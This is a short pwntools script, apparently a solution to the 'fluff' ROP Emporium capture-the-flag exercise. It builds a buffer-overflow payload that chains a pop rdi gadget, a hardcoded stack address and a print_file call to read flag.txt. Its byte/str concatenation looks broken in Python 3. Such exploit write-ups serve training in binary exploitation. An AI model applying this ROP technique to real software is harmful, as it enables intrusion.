from pwn import *

#pr = process("./fluff")

print_file = p64(0x400620)
pop_rdi = p64(0x4006a3)
ret = p64(0x400295)
start_of_flag = p64(0x7fffffffe190)

#Get us into rop territory
payload = b"flag.txt\x00\x00\x00\x00"+ "A"*28

# pop address of start of buffer into rdi and call print flag on it 
payload += pop_rdi + start_of_flag +print_file

# print payload
print(payload)